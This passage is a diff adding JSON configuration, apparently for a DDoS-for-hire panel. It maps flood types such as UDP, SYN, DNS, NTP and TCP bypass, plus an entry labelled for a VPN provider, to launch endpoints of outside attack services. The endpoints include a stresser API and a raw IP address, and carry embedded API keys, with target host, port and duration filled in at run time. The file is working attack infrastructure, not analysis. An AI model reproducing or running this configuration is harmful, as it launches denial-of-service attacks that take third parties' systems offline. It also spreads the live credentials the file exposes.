+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"http-browser",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&time=<<$duration>>&method=<<$method>>&reqmethod=GET&rps=32",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udpflood":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPPLAIN4096",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udphex":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPFLOOD",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"dns",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udpplain":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPPLAIN",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"ntp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "synflood":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"SYNFLOOD",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"syn",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "tcpbypass":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"TCPBYPASSV2",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "tcp-overflow":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"TCPBYPASSV2",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"tcptfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udpbypass":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPBPYASS",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"udp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udpbypassv2":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPBPYASS",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "octovpn":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPFLOOD",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "udp-bomb":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"UDPPLAIN4096",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "tcp-bomb":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"TCPBYPASSV2",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"sadp",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                }
+            ]
+        },
+        "handshake":{
+            "enabled":true,
+            "maxtime":8000,
+            "targets":[
+                {
+                    "method":"TCPBYPASSV2",
+                    "target":"http://45.88.90.123:8824/api.php?key=9jimdsrgmio9j!hrg9i(@&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
+                    "target":"https://api.digitalstress.net/api/launch?user=710&key=BV7UY1m4d7zXBEXT&host=<<$target>>&port=<<$port>>&time=<<$duration>>&method=<<$method>>",
+                    "pathEncoding":true,
+                    "verbosity" : true
+                },
+                {
+                    "method":"nfo",
